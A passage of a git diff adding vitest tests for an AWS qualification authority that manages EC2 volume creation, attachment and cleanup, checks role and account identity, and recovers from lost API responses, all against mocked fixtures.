++  throw new Error("not completed");
++}
++describe("one-copy first-walk owner lifecycle", () => {
++  it.each(["CreateVolume", "AttachVolume"])("never replaces a denied %s intent", async (action) => {
++    const f = fixture();
++    f.reject = action;
++    await expect(prepareFirstWalk(f.owner, request)).rejects.toThrow("denied");
++    f.reject = undefined;
++    await expect(prepareFirstWalk(f.owner, request)).rejects.toThrow(/unresolved|retry reads/);
++    expect(f.calls.filter((c) => c.action === action)).toHaveLength(1);
++    await cleanupFirstWalk(f.owner);
++    expect(f.volume).toBe(false);
++  });
++  it.each(["paginated", "multiple"])(
++    "refuses %s volume discovery without attaching or deleting",
++    async (kind) => {
++      const f = fixture();
++      f.loss = "CreateVolume";
++      await expect(prepareFirstWalk(f.owner, request)).rejects.toThrow("lost");
++      const query = f.owner.query;
++      f.owner.query = async (...args) => {
++        const body = await query(...args);
++        if (args[0] !== "DescribeVolumes") return body;
++        return kind === "paginated"
++          ? body.replace(
++              "</DescribeVolumesResponse>",
++              "<nextToken>more</nextToken></DescribeVolumesResponse>",
++            )
++          : body.replace("</volumeSet>", body.match(/<item>.*<\/item>/)![0] + "</volumeSet>");
++      };
++      await expect(prepareFirstWalk(f.owner, request)).rejects.toThrow(/paginated|exceeds/);
++      await expect(cleanupFirstWalk(f.owner)).rejects.toThrow(/paginated|exceeds/);
++      expect(f.calls.some((c) => ["AttachVolume", "DeleteVolume"].includes(c.action))).toBe(false);
++    },
++  );
++  it("creates once after admission, attaches exact IDs and proves deletion policy by readback", async () => {
++    const f = fixture();
++    expect((await complete(f)).phase).toBe("attached");
++    await prepareFirstWalk(f.owner, request);
++    const creates = f.calls.filter((c) => c.action === "CreateVolume");
++    expect(creates).toHaveLength(1);
++    expect(creates[0]?.parameters).toMatchObject({
++      SnapshotId: request.snapshotID,
++      AvailabilityZone: "us-east-1a",
++      VolumeType: "gp3",
++      Iops: "3000",
++      Throughput: "125",
++      Encrypted: "true",
++    });
++    expect(creates[0]?.parameters["ClientToken"]).toMatch(/^[a-f0-9]{64}$/);
++    expect(f.calls.filter((c) => c.action === "AttachVolume")).toHaveLength(1);
++    expect(f.calls.some((c) => JSON.stringify(c).includes("UUID"))).toBe(false);
++    await expect(
++      prepareFirstWalk(f.owner, { ...request, snapshotID: "snap-44444444" }),
++    ).rejects.toThrow("immutable");
++  });
++  it.each(["CreateVolume", "AttachVolume", "ModifyInstanceAttribute"])(
++    "recovers a committed %s response loss from durable state without replacement",
++    async (action) => {
++      const f = fixture();
++      f.loss = action;
++      for (let i = 0; i < 4; i++) {
++        try {
++          // oxlint-disable-next-line eslint/no-await-in-loop -- each retry depends on the previous persisted outcome.
++          await prepareFirstWalk(f.owner, request);
++        } catch {
++          /* next RPC reads same persisted state */
++        }
++      }
++      expect(f.state?.phase).toBe("attached");
++      expect(f.calls.filter((c) => c.action === "CreateVolume")).toHaveLength(1);
++      expect(f.calls.filter((c) => c.action === "AttachVolume")).toHaveLength(1);
++    },
++  );
++  it("retains an uncertain empty create and never creates a replacement", async () => {
++    const f = fixture();
++    f.loss = "CreateVolume";
++    f.visible = false;
++    await expect(prepareFirstWalk(f.owner, request)).rejects.toThrow("lost");
++    await expect(prepareFirstWalk(f.owner, request)).rejects.toThrow("unresolved");
++    expect(f.calls.filter((c) => c.action === "CreateVolume")).toHaveLength(1);
++    f.visible = true;
++    await complete(f);
++  });
++  it("cleans an unattached partial create, preserves source and retries deletion after lost response", async () => {
++    const f = fixture();
++    f.reject = "AttachVolume";
++    await expect(prepareFirstWalk(f.owner, request)).rejects.toThrow("denied");
++    f.reject = undefined;
++    f.loss = "DeleteVolume";
++    await expect(cleanupFirstWalk(f.owner)).rejects.toThrow("lost");
++    expect(await cleanupFirstWalk(f.owner)).toEqual(["vol-33333333"]);
++    expect(f.volume).toBe(false);
++    expect(
++      f.calls.some((c) => ["DeleteSnapshot", "DeregisterImage", "DetachVolume"].includes(c.action)),
++    ).toBe(false);
++  });
++  it("waits for guest settlement and retries explicit volume deletion failure", async () => {
++    const f = fixture();
++    await complete(f);
++    await expect(cleanupFirstWalk(f.owner)).rejects.toThrow("busy");
++    f.settleGuest();
++    f.reject = "DeleteVolume";
++    await expect(cleanupFirstWalk(f.owner)).rejects.toThrow("denied");
++    expect(f.volume).toBe(true);
++    f.reject = undefined;
++    expect(await cleanupFirstWalk(f.owner)).toEqual(["vol-33333333"]);
++  });
++  it("rejects device collision and foreign exact-volume readback before mutation", async () => {
++    const f = fixture();
++    f.occupied = true;
++    await expect(prepareFirstWalk(f.owner, request)).rejects.toThrow("one root EBS volume");
++    expect(f.calls.some((c) => c.mutating)).toBe(false);
++    f.occupied = false;
++    f.loss = "CreateVolume";
++    await expect(prepareFirstWalk(f.owner, request)).rejects.toThrow("lost");
++    f.foreign = true;
++    await expect(cleanupFirstWalk(f.owner)).rejects.toThrow("identity");
++    expect(f.calls.some((c) => c.action === "DeleteVolume")).toBe(false);
++  });
++  it("a live cancellation fence stops dispatch while preserving the cleanup intent", async () => {
++    const f = fixture();
++    f.cancelled = true;
++    await expect(prepareFirstWalk(f.owner, request)).rejects.toThrow("fenced");
++    expect(f.state?.phase).toBe("creating");
++    expect(f.volume).toBe(false);
++    f.cancelled = false;
++    expect(await cleanupFirstWalk(f.owner)).toEqual([]);
++  });
++});
+diff --git a/worker/test/aws-qualification-authority.test.ts b/worker/test/aws-qualification-authority.test.ts
+index 0cc641893c499a52165db94d87bde1f0e6b22d9c..3ad1df09dc60299892eefdbe1a5dd67ed9809579 100644
+--- a/worker/test/aws-qualification-authority.test.ts
++++ b/worker/test/aws-qualification-authority.test.ts
+@@ -1,7 +1,10 @@
++import { createHash } from "node:crypto";
+ import { readFileSync } from "node:fs";
+ 
++import { XMLBuilder, XMLParser } from "fast-xml-parser";
+ import { afterEach, describe, expect, it, vi } from "vitest";
+ 
++import { fixtureNetwork } from "../../scripts/fixtures/qualification-network.mjs";
+ import { EC2SpotClient } from "../src/aws";
+ import {
+   AWSQualificationController,
+@@ -107,12 +110,27 @@ describe("AWS qualification authority deployment", () => {
+         () => {
+           assertActive: typeof assertActive;
+           claim: typeof claim;
++          enrollAndClaim: (
++            props: AWSQualificationControllerProps,
++            value: AWSQualificationRunIdentity,
++          ) => Promise<unknown>;
+           discover: typeof discover;
+           markFinalizing: typeof markFinalizing;
+           markFinalized: typeof markFinalized;
+           retire: typeof retire;
+         }
+-      >(() => ({ assertActive, claim, discover, markFinalizing, markFinalized, retire })),
++      >(() => ({
++        assertActive,
++        claim,
++        discover,
++        markFinalizing,
++        markFinalized,
++        retire,
++        enrollAndClaim: async (props, value) => {
++          await enroll(props, value);
++          return await claim(props, value);
++        },
++      })),
+     };
+     const env = {
+       AWS_QUALIFICATION_RUNS: namespace,
+@@ -544,17 +562,23 @@ describe("AWS qualification authority", () => {
+           if (typeof key === "object" && Object.hasOwn(key, "run")) expireWork();
+         });
+       } else if (delay === "registry transport") {
+-        const claim = fixture.registry.claim.bind(fixture.registry);
+-        vi.spyOn(fixture.registry, "claim").mockImplementation(async (...args) => {
++        const enroll = fixture.run.enroll.bind(fixture.run);
++        vi.spyOn(fixture.run, "enroll").mockImplementation(async (...args) => {
++          await enroll(...args);
+           expireWork();
+-          return await claim(...args);
+         });
+       } else {
+         const get = fixture.registryStorage.get.bind(fixture.registryStorage);
++        let activeReads = 0;
+         vi.spyOn(fixture.registryStorage, "get").mockImplementation(
+           async <T>(key: string): Promise<T | undefined> => {
+             const value = await get<T>(key);
+-            if (key === (delay === "retirement read" ? "retired" : "active")) expireWork();
++            if (key === "active") activeReads++;
++            if (
++              (delay === "retirement read" && key === "retired") ||
++              (delay === "active registry read" && key === "active" && activeReads === 2)
++            )
++              expireWork();
+             return value;
+           },
+         );
+@@ -591,6 +615,7 @@ describe("AWS qualification authority", () => {
+   it("preserves lexical AWS account IDs when verifying retained resources", async () => {
+     const fixture = authorityFixture();
+     fixture.env.CRABBOX_AWS_QUALIFICATION_ACCOUNT_ID = "001234567890";
++    fixture.env.CRABBOX_AWS_QUALIFICATION_ROLE_ARN = "arn:aws:iam::001234567890:role/Qualification";
+     fixture.signer.accountId = "001234567890";
+     await expect(fixture.run.enroll(controller, retainedIdentity())).resolves.toBeUndefined();
+   });
+@@ -2011,6 +2036,230 @@ describe("AWS qualification authority", () => {
+     expect(fixture.signer.calls.filter((call) => call.action === "DeleteSnapshot").length).toBe(2);
+   });
+ 
++  it.each([
++    "arn:aws:sts::123456789012:assumed-role/Production/qualification-test",
++    "arn:aws:iam::123456789012:user/Qualification",
++    "arn:aws:sts::123456789012:assumed-role/QualificationExtra/qualification-test",
++    "arn:aws:sts::999999999999:assumed-role/Qualification/qualification-test",
++    "",
++  ])(
++    "fences same-account or malformed principals before provisioning and cleanup: %s",
++    async (principal) => {
++      const fixture = authorityFixture();
++      await fixture.run.enroll(controller, identity);
++      await importKey(fixture);
++      fixture.signer.principalArn = principal;
++      const before = fixture.signer.calls.length;
++      await expect(
++        fixture.run.execute(identity, request("RunInstances", runInstancesParams(), "ec2")),
++      ).rejects.toThrow("wrong role");
++      await expect(fixture.run.finalize(controller)).rejects.toThrow("wrong role");
++      expect(
++        fixture.signer.calls.slice(before).every(({ action }) => action === "GetCallerIdentity"),
++      ).toBe(true);
++      expect((await fixture.run.attest(controller)).finalized).toBe(false);
++    },
++  );
++
++  it("requires a role ARN and binds role changes into the enrolled policy", async () => {
++    const fixture = authorityFixture();
++    fixture.env.CRABBOX_AWS_QUALIFICATION_ROLE_ARN = "";
++    await expect(fixture.run.enroll(controller, identity)).rejects.toThrow("role ARN is malformed");
++    fixture.env.CRABBOX_AWS_QUALIFICATION_ROLE_ARN = "arn:aws:iam::123456789012:role/Qualification";
++    await fixture.run.enroll(controller, identity);
++    fixture.env.CRABBOX_AWS_QUALIFICATION_ROLE_ARN = "arn:aws:iam::123456789012:role/Production";
++    await expect(fixture.run.execute(identity, request("GetCallerIdentity"))).rejects.toThrow(
++      "policy changed",
++    );
++  });
++
++  it("settles a legacy persisted policy through the controller without rewriting enrollment", async () => {
++    useImmediateTimeouts();
++    const fixture = authorityHTTPFixture(identity);
++    await fixture.controller.claim(identity);
++    await importKey(fixture);
++    await fixture.candidate.execute(request("RunInstances", runInstancesParams(), "ec2"));
++    const before = await persistLegacyPolicy(fixture);
++    fixture.env.CRABBOX_AWS_QUALIFICATION_AUTHORITY_SHA = "f".repeat(40);
++    const network = await fixtureNetwork();
++    Object.assign(fixture.env, {
++      CRABBOX_AWS_QUALIFICATION_NETWORK_JSON: JSON.stringify(network.network),
++    });
++    fixture.reopen();
++    await expect(fixture.candidate.execute(request("GetCallerIdentity"))).rejects.toThrow(
++      "policy changed",
++    );
++
++    await fixture.controller.finalize(identity.runId);
++    expect(await fixture.storage.get("run")).toMatchObject({
++      policy: before["policy"],
++      policyHash: before["policyHash"],
++      authoritySha: before["authoritySha"],
++      legacyCleanupRoleArn: fixture.env.CRABBOX_AWS_QUALIFICATION_ROLE_ARN,
++      finalizationSource: "controller",
++      finalizedAt: expect.any(String),
++    });
++    expect((await fixture.controller.attest(identity.runId)).finalReceipt).toMatchObject({
++      failureCodes: [],
++      finalCounts: { images: 0, instances: 0, keyPairs: 0, snapshots: 0, volumes: 0 },
++    });
++    expect(fixture.signer.calls.filter(({ action }) => action === "RunInstances")).toHaveLength(1);
++    expect(fixture.signer.calls.some(({ action }) => action === "TerminateInstances")).toBe(true);
++    await fixture.controller.retire(identity.runId);
++    expect(await fixture.controller.discover()).toBeUndefined();
++  });
++
++  it("pins a legacy cleanup role across failed cleanup, restart and alarm retry", async () => {
++    useImmediateTimeouts();
++    const fixture = authorityHTTPFixture(identity);
++    await fixture.controller.claim(identity);
++    await importKey(fixture);
++    await persistLegacyPolicy(fixture);
++    const execute = fixture.signer.execute.bind(fixture.signer);
++    const fail = vi.spyOn(fixture.signer, "execute").mockImplementation(async (...args) => {
++      if (args[1] === "DeleteKeyPair") throw new Error("cleanup transport unavailable");
++      return await execute(...args);
++    });
++    await expect(fixture.controller.finalize(identity.runId)).rejects.toThrow("cleanup incomplete");
++    expect(await fixture.storage.get("run")).toMatchObject({
++      legacyCleanupRoleArn: fixture.env.CRABBOX_AWS_QUALIFICATION_ROLE_ARN,
++    });
++    expect(fixture.storage.alarm).toEqual(expect.any(Number));
++    fail.mockRestore();
++    fixture.env.CRABBOX_AWS_QUALIFICATION_ROLE_ARN = "arn:aws:iam::123456789012:role/Production";
++    fixture.signer.principalArn = "arn:aws:sts::123456789012:assumed-role/Production/test";
++    fixture.reopen();
++    const before = fixture.signer.calls.length;
++    await expect(fixture.run.alarm()).rejects.toThrow("wrong role");
++    expect(fixture.signer.calls.slice(before).map(({ action }) => action)).toEqual([
++      "GetCallerIdentity",
++    ]);
++    await expect(fixture.run.execute(identity, request("GetCallerIdentity"))).rejects.toThrow(
++      "finalizing",
++    );
++    fixture.signer.principalArn = undefined;
++    fixture.reopen();
++    await fixture.run.alarm();
++    expect((await fixture.controller.attest(identity.runId)).finalized).toBe(true);
++    await fixture.controller.finalize(identity.runId);
++    await fixture.controller.retire(identity.runId);
++    expect(await fixture.controller.discover()).toBeUndefined();
++  });
++
++  it("recovers a legacy pending image on the automatic cleanup path after restart", async () => {
++    useImmediateTimeouts();
++    const fixture = authorityFixture({ loseAfterEffect: "CreateImage" });
++    await fixture.run.enroll(controller, identity);
++    await importKey(fixture);
++    await fixture.run.execute(identity, request("RunInstances", runInstancesParams(), "ec2"));
++    await expect(
++      fixture.run.execute(
++        identity,
++        request(
++          "CreateImage",
++          {
++            InstanceId: "i-owned",
++            Name: "qualification-image",
++            NoReboot: "true",
++          },
++          "ec2",
++        ),
++      ),
++    ).rejects.toThrow("lost response");
++    const before = await persistLegacyPolicy(fixture);
++    const reopened = new AWSQualificationRun(
++      { storage: fixture.storage } as never,
++      fixture.env as never,
++      fixture.signer,
++    );
++    await reopened.alarm();
++    expect(await fixture.storage.get("run")).toMatchObject({
++      policy: before["policy"],
++      policyHash: before["policyHash"],
++      finalizationSource: "automatic",
++      finalizedAt: expect.any(String),
++    });
++    expect((await reopened.attest(controller)).finalReceipt).toMatchObject({
++      failureCodes: [],
++      finalCounts: { images: 0, instances: 0, keyPairs: 0, snapshots: 0, volumes: 0 },
++    });
++    expect(fixture.signer.calls.filter(({ action }) => action === "CreateImage")).toHaveLength(1);
++    for (const action of [
++      "DeregisterImage",
++      "DeleteSnapshot",
++      "TerminateInstances",
++      "DeleteKeyPair",
++    ]) {
++      expect(fixture.signer.calls.some((call) => call.action === action)).toBe(true);
++    }
++  });
++
++  it("retains a legacy role pin after an uncertain storage response without dispatching cleanup", async () => {
++    useImmediateTimeouts();
++    const fixture = authorityFixture();
++    await fixture.run.enroll(controller, identity);
++    await importKey(fixture);
++    await persistLegacyPolicy(fixture);
++    const put = fixture.storage.put.bind(fixture.storage);
++    let lost = false;
++    vi.spyOn(fixture.storage, "put").mockImplementation(async (key, value) => {
++      await put(key, value);
++      if (!lost && key === "run" && (value as Record<string, unknown>)["legacyCleanupRoleArn"]) {
++        lost = true;
++        throw new Error("lost pin response");
++      }
++    });
++    const before = fixture.signer.calls.length;
++    await expect(fixture.run.finalize(controller)).rejects.toThrow("lost pin response");
++    expect(fixture.signer.calls.slice(before).map(({ action }) => action)).toEqual([
++      "GetCallerIdentity",
++    ]);
++    expect(await fixture.storage.get("run")).toHaveProperty("legacyCleanupRoleArn");
++    const reopened = new AWSQualificationRun(
++      { storage: fixture.storage } as never,
++      fixture.env as never,
++      fixture.signer,
++    );
++    await reopened.alarm();
++    expect((await reopened.attest(controller)).finalized).toBe(true);
++  });
++
++  it.each([
++    "policy drift",
++    "hash mismatch",
++    "unknown schema",
++    "wrong role",
++    "wrong account",
++    "missing role",
++  ])("refuses an unverified legacy cleanup transition: %s", async (reason) => {
++    const fixture = authorityFixture();
++    await fixture.run.enroll(controller, identity);
++    await importKey(fixture);
++    const stored = await persistLegacyPolicy(fixture);
++    if (reason === "policy drift") fixture.env.CRABBOX_AWS_QUALIFICATION_SUBNET_ID = "subnet-other";
++    if (reason === "hash mismatch") stored["policyHash"] = "0".repeat(64);
++    if (reason === "unknown schema") {
++      (stored["policy"] as Record<string, unknown>)["network"] = null;
++      stored["policyHash"] = legacyPolicyHash(stored["policy"] as Record<string, unknown>);
++    }
++    if (reason === "wrong role")
++      fixture.signer.principalArn = "arn:aws:sts::123456789012:assumed-role/Production/test";
++    if (reason === "wrong account") fixture.signer.accountId = "999999999999";
++    if (reason === "missing role") fixture.env.CRABBOX_AWS_QUALIFICATION_ROLE_ARN = "";
++    await fixture.storage.put("run", stored);
++    const before = fixture.signer.calls.length;
++    await expect(fixture.run.finalize(controller)).rejects.toThrow(/AWS qualification/);
++    expect(
++      fixture.signer.calls.slice(before).every(({ action }) => action === "GetCallerIdentity"),
++    ).toBe(true);
++    expect(await fixture.storage.get("run")).not.toHaveProperty("legacyCleanupRoleArn");
++    expect((await fixture.run.attest(controller)).finalized).toBe(false);
++    expect(fixture.storage.alarm).toEqual(expect.any(Number));
++    await expect(fixture.run.execute(identity, request("GetCallerIdentity"))).rejects.toThrow(
++      "finalizing",
++    );
++  });
++
+   it("revalidates the expected STS account before every mutation", async () => {
+     const fixture = authorityFixture();
+     await fixture.run.enroll(controller, identity);
+@@ -2026,6 +2275,7 @@ describe("AWS qualification authority", () => {
+   it("preserves leading-zero account and reservation owner identities", async () => {
+     const fixture = authorityFixture();
+     fixture.env.CRABBOX_AWS_QUALIFICATION_ACCOUNT_ID = "001234567890";
++    fixture.env.CRABBOX_AWS_QUALIFICATION_ROLE_ARN = "arn:aws:iam::001234567890:role/Qualification";
+     fixture.signer.accountId = "001234567890";
+     fixture.signer.ownerId = "001234567890";
+     await fixture.run.enroll(controller, identity);
+@@ -2363,6 +2613,423 @@ describe("AWS qualification candidate transport", () => {
+   });
+ });
+ 
++describe("first-walk integration with the existing authority", () => {
++  function clockClaim(firstWalk: boolean, minutes: number) {
++    const f = firstWalkAuthorityFixture();
++    const candidate = {
++      ...f.identity,
++      expiresAt: new Date(Date.now() + minutes * 60_000).toISOString(),
++    };
++    if (!firstWalk) {
++      delete candidate.firstWalk;
++      delete candidate.retainedImage;
++    }
++    const registry = new AWSQualificationRegistry(
++      { storage: new MemoryStorage() } as never,
++      {} as never,
++    );
++    return registry.claim(controller, candidate);
++  }
++
++  it.each([
++    { firstWalk: true, minutes: 150 },
++    { firstWalk: false, minutes: 120 },
++  ])("accepts only the mode's maximum window: %j", async ({ firstWalk, minutes }) => {
++    await expect(clockClaim(firstWalk, minutes)).resolves.toBeDefined();
++  });
++
++  it.each([
++    { firstWalk: true, minutes: 151 },
++    { firstWalk: false, minutes: 121 },
++  ])("rejects a window above the mode's maximum: %j", async ({ firstWalk, minutes }) => {
++    await expect(clockClaim(firstWalk, minutes)).rejects.toThrow("expiry");
++  });
++
++  it("keeps finalization pending on incomplete inventory and recovers without losing exact copy identity", async () => {
++    const f = firstWalkAuthorityFixture();
++    await f.run.enroll(controller, f.identity);
++    await importKey(f, f.identity);
++    await f.run.execute(f.identity, request("RunInstances", runInstancesParams(), "ec2"));
++    await f.attach();
++    f.paginate(true);
++    await expect(f.run.finalize(controller)).rejects.toThrow("incomplete");
++    expect((await f.run.firstWalkStatus(f.identity)).finalized).toBe(false);
++    f.paginate(false);
++    await f.run.finalize(controller);
++    expect((await f.run.firstWalkStatus(f.identity)).finalized).toBe(true);
++  });
++  it("denies raw volume APIs and the typed operation without the opt-in binding", async () => {
++    const f = authorityFixture();
++    await f.run.enroll(controller, identity);
++    await expect(f.run.execute(identity, request("CreateVolume", {}, "ec2"))).rejects.toThrow(
++      "not allowed",
++    );
++    await expect(f.run.prepareFirstWalk(identity, firstWalkRequest())).rejects.toThrow(
++      "not enabled",
++    );
++  });
++  it("bounds stock launch selection and keeps borrowed snapshot reads separate from copy deletion", async () => {
++    const f = firstWalkAuthorityFixture();
++    await f.run.enroll(controller, f.identity);
++    await importKey(f, f.identity);
++    await expect(
++      f.run.execute(
++        f.identity,
++        request(
++          "RunInstances",
++          { ...runInstancesParams(), ImageId: f.identity.retainedImage!.imageId },
++          "ec2",
++        ),
++      ),
++    ).rejects.toThrow("outside the run ledger");
++    await f.run.execute(f.identity, request("RunInstances", runInstancesParams(), "ec2"));
++    await f.attach();
++    const proof = await f.run.firstWalkStatus(f.identity);
++    expect(proof).toMatchObject({ finalized: false, volumeID: "vol-33333333", phase: "attached" });
++    expect(await f.storage.get("ledger")).toMatchObject({
++      volumeIds: expect.arrayContaining(["vol-55555555", "vol-33333333"]),
++    });
++    await f.run.finalize(controller);
++    expect(await f.run.firstWalkStatus(f.identity)).toMatchObject({ finalized: true });
++    expect(
++      f.signer.calls
++        .filter((c) => c.action === "DeleteVolume")
++        .map((c) => c.parameters["VolumeId"]),
++    ).toEqual(["vol-33333333"]);
++    expect(
++      f.signer.calls.some((c) => c.action === "DeleteSnapshot" || c.action === "DetachVolume"),
++    ).toBe(false);
++  });
++  it.each(["CreateVolume", "AttachVolume", "DeleteVolume"])(
++    "retains ownership and pins across an uncertain %s response and restart",
++    async (fault) => {
++      const f = firstWalkAuthorityFixture();
++      await f.run.enroll(controller, f.identity);
++      await importKey(f, f.identity);
++      await f.run.execute(f.identity, request("RunInstances", runInstancesParams(), "ec2"));
++      f.fault(fault);
++      for (let i = 0; i < 4; i++) {
++        try {
++          // oxlint-disable-next-line eslint/no-await-in-loop -- each retry depends on the previous persisted outcome.
++          await f.run.prepareFirstWalk(f.identity, firstWalkRequest());
++        } catch {
++          /* durable retry */
++        }
++      }
++      let cleanupError: unknown;
++      try {
++        await f.run.finalize(controller);
++      } catch (error) {
++        cleanupError = error;
++      }
++      expect(Boolean(cleanupError)).toBe(fault === "DeleteVolume");
++      // Reconstruct the Durable Object; no in-memory volume ownership may be required.
++      const restarted = new AWSQualificationRun(
++        { storage: f.storage } as never,
++        f.env as never,
++        f.signer,
++      );
++      await restarted.finalize(controller);
++      expect(await restarted.firstWalkStatus(f.identity)).toMatchObject({ finalized: true });
++      expect(f.signer.calls.filter((c) => c.action === "CreateVolume")).toHaveLength(1);
++      expect(f.signer.calls.filter((c) => c.action === "AttachVolume")).toHaveLength(1);
++      await expect(restarted.prepareFirstWalk(f.identity, firstWalkRequest())).rejects.toThrow(
++        "finalized",
++      );
++    },
++  );
++  it("a controller cancellation fences attachment and finalizes an unattached partial copy", async () => {
++    const f = firstWalkAuthorityFixture();
++    await f.run.enroll(controller, f.identity);
++    await importKey(f, f.identity);
++    await f.run.execute(f.identity, request("RunInstances", runInstancesParams(), "ec2"));
++    f.fault("CreateVolume");
++    await expect(f.run.prepareFirstWalk(f.identity, firstWalkRequest())).rejects.toThrow("lost");
++    await f.run.beginFinalization(controller);
++    await expect(f.run.prepareFirstWalk(f.identity, firstWalkRequest())).rejects.toThrow(
++      "finalizing",
++    );
++    await f.run.finalize(controller);
++    expect(await f.run.firstWalkStatus(f.identity)).toMatchObject({ finalized: true });
++    expect(f.signer.calls.some((c) => c.action === "AttachVolume")).toBe(false);
++  });
++});
++
++describe("shared-subnet authority admission and settlement", () => {
++  it("checks network before enrollment and refuses missing permissions without allocation", async () => {
++    const f = authorityFixture();
++    const net = await sharedNetwork(f);
++    net.roots.DescribeRouteTables.nextToken = "more";
++    await expect(f.run.enroll(controller, identity)).rejects.toThrow("network admission");
++    expect(await f.storage.get("run")).toBeUndefined();
++    expect(f.signer.calls.some((c) => c.action === "RunInstances")).toBe(false);
++    delete net.roots.DescribeRouteTables.nextToken;
++    net.deny = "DescribeNetworkAcls";
++    await expect(f.run.enroll(controller, identity)).rejects.toThrow(
++      "DescribeNetworkAcls http 403",
++    );
++  });
++  it("checks launch/readback and denies later forward work after network drift, while cleanup succeeds", async () => {
++    useImmediateTimeouts();
++    const f = authorityFixture();
++    const net = await sharedNetwork(f);
++    await f.run.enroll(controller, identity);
++    await importKey(f);
++    await f.run.execute(identity, request("RunInstances", runInstancesParams(), "ec2"));
++    await f.run.execute(
++      identity,
++      request("DescribeInstances", { "InstanceId.1": "i-owned" }, "ec2"),
++    );
++    net.table.routeSet.item.push({
++      destinationCidrBlock: "10.0.0.0/8",
++      gatewayId: "pcx-11111111",
++      state: "active",
++    });
++    await expect(
++      f.run.execute(
++        identity,
++        request("CreateImage", { InstanceId: "i-owned", Name: "crabbox-image" }, "ec2"),
++      ),
++    ).rejects.toThrow("network admission");
++    expect(f.signer.calls.some((c) => c.action === "CreateImage")).toBe(false);
++    const before = f.signer.calls.filter((c) => c.action === "DescribeRouteTables").length;
++    await f.run.beginFinalization(controller);
++    await f.run.finalize(controller);
++    expect((await f.run.attest(controller)).finalized).toBe(true);
++    expect(f.signer.calls.filter((c) => c.action === "DescribeRouteTables")).toHaveLength(before);
++  });
++  it("keeps launch ownership when guest verification fails, rechecks receipt replays and settles after restart", async () => {
++    useImmediateTimeouts();
++    const f = authorityFixture();
++    const net = await sharedNetwork(f);
++    await f.run.enroll(controller, identity);
++    await importKey(f);
++    net.guest.iamInstanceProfile = { arn: "arn:aws:iam::123456789012:instance-profile/Unexpected" };
++    const launch = request("RunInstances", runInstancesParams(), "ec2");
++    await expect(f.run.execute(identity, launch)).rejects.toThrow("network admission");
++    expect(await f.storage.get("ledger")).toMatchObject({
++      instanceIds: ["i-owned"],
++      volumeIds: ["vol-owned"],
++    });
++    await expect(f.run.execute(identity, launch)).rejects.toThrow("network admission");
++    expect(f.signer.calls.filter((c) => c.action === "RunInstances")).toHaveLength(1);
++    net.deny = "DescribeRouteTables";
++    const reopened = new AWSQualificationRun(
++      { storage: f.storage } as never,
++      f.env as never,
++      f.signer,
++    );
++    await reopened.finalize(controller);
++    expect((await reopened.attest(controller)).finalized).toBe(true);
++  });
++  it("checks an uncertain generic launch replay without changing its idempotency token", async () => {
++    useImmediateTimeouts();
++    const f = authorityFixture({ loseAfterEffect: "RunInstances" });
++    const net = await sharedNetwork(f);
++    await f.run.enroll(controller, identity);
++    await importKey(f);
++    const launch = request("RunInstances", runInstancesParams(), "ec2");
++    await expect(f.run.execute(identity, launch)).rejects.toThrow("lost response");
++    net.guest.groupSet.item.push({ groupId: "sg-99999999" });
++    await expect(f.run.execute(identity, launch)).rejects.toThrow("network admission");
++    const launches = f.signer.calls.filter((c) => c.action === "RunInstances");
++    expect(launches).toHaveLength(2);
++    expect(launches[0]!.parameters["ClientToken"]).toBe(launches[1]!.parameters["ClientToken"]);
++    await f.run.finalize(controller);
++    expect((await f.run.attest(controller)).finalized).toBe(true);
++  });
++  it("checks the attachment recipient before creating a copy and cleans up despite later route denial", async () => {
++    const f = firstWalkAuthorityFixture();
++    const net = await sharedNetwork(f);
++    await f.run.enroll(controller, f.identity);
++    await importKey(f, f.identity);
++    await f.run.execute(f.identity, request("RunInstances", runInstancesParams(), "ec2"));
++    net.guest.networkInterfaceSet.item[0].groupSet.item.push({ groupId: "sg-99999999" });
++    await expect(f.attach()).rejects.toThrow("network admission");
++    expect(f.signer.calls.some((c) => c.action === "CreateVolume")).toBe(false);
++    net.guest.networkInterfaceSet.item[0].groupSet.item.pop();
++    await f.attach();
++    net.deny = "DescribeRouteTables";
++    await f.run.beginFinalization(controller);
++    await f.run.finalize(controller);
++    expect((await f.run.firstWalkStatus(f.identity)).finalized).toBe(true);
++    expect(
++      f.signer.calls
++        .filter((c) => c.action === "DeleteVolume")
++        .map((c) => c.parameters["VolumeId"]),
++    ).toEqual(["vol-33333333"]);
++    expect(f.signer.calls.some((c) => c.action === "DeleteSnapshot")).toBe(false);
++  });
++});
++
++async function sharedNetwork(f: ReturnType<typeof authorityFixture>) {
++  const net = await fixtureNetwork({
++    accountId: f.env.CRABBOX_AWS_QUALIFICATION_ACCOUNT_ID,
++    subnetId: f.env.CRABBOX_AWS_QUALIFICATION_SUBNET_ID,
++    securityGroupId: f.env.CRABBOX_AWS_QUALIFICATION_SECURITY_GROUP_ID,
++  });
++  Object.assign(f.env, { CRABBOX_AWS_QUALIFICATION_NETWORK_JSON: JSON.stringify(net.network) });
++  f.signer.ownerId = f.env.CRABBOX_AWS_QUALIFICATION_ACCOUNT_ID;
++  const original = f.signer.execute.bind(f.signer);
++  const builder = new XMLBuilder();
++  const parser = new XMLParser();
++  const state = { ...net, deny: "" };
++  f.signer.execute = async (service, action, region, parameters) => {
++    if (action in net.roots) {
++      f.signer.calls.push({ service, action, region, parameters: structuredClone(parameters) });
++      if (state.deny === action) return new Response("<Response/>", { status: 403 });
++      return xml(builder.build({ [`${action}Response`]: net.roots[action] }));
++    }
++    const response = await original(service, action, region, parameters);
++    if (action !== "DescribeInstances" || response.status >= 300) return response;
++    const doc = parser.parse(await response.text());
++    const reservations = doc.DescribeInstancesResponse.reservationSet?.item;
++    for (const reservation of reservations
++      ? Array.isArray(reservations)
++        ? reservations
++        : [reservations]
++      : []) {
++      const entries = reservation.instancesSet?.item;
++      for (const instance of entries ? (Array.isArray(entries) ? entries : [entries]) : []) {
++        const { instanceId, instanceState } = instance;
++        Object.assign(instance, structuredClone(net.guest), { instanceId, instanceState });
++      }
++    }
++    return xml(builder.build(doc));
++  };
++  return state;
++}
++
++function firstWalkRequest() {
++  return {
++    checkpointID: "chk_capture",
++    claimHash: "a".repeat(64),
++    instanceID: "i-11111111",
++    snapshotID: "snap-22222222",
++    readinessReceiptSha256: "b".repeat(64),
++  };
++}
++function firstWalkAuthorityFixture() {
++  useImmediateTimeouts();
++  const f = authorityFixture();
++  const runIdentity = {
++    ...retainedIdentity(),
++    firstWalk: true as const,
++    expiresAt: new Date(Date.now() + 120 * 60_000).toISOString(),
++  };
++  f.signer.ownerId = f.signer.accountId;
++  const original = f.signer.execute.bind(f.signer);
++  let volume = false,
++    attached = false,
++    dot = false,
++    fault: string | undefined;
